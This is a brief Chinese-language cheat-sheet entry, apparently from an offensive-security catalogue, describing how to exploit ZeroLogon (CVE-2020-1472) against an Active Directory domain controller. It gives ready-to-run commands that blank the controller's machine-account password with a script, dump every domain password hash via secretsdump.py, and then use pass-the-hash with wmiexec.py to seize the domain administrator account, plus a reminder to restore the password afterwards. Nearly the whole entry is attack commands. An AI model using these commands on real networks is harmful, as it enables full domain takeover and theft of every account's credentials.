### ZeroLogon

| 属性 | 值 |
|------|-----|
| 版本 | N/A |
| 平台 | Linux |
| 风险 | 🔴 高 |
| 标签 | `漏洞利用` `特权提升` `AD` |

## ZeroLogon (CVE-2020-1472) 漏洞利用

### 攻击域控，将其密码置空
```bash
bash zerologon.sh DC01 192.168.1.10
```

### 使用空密码导出所有域 Hash
```bash
secretsdump.py -no-pass DC01\$@192.168.1.10
```

### 获取域管 Hash 后进行 PTH 控制域控
```bash
wmiexec.py contoso.com/administrator@192.168.1.10 -hashes :<Admin_Hash>
```

- ✓ 直接获取域控最高权限
- ✓ 利用 Netlogon 加密协议缺陷
- 攻击后必须恢复域控机器账户密码以防脱域
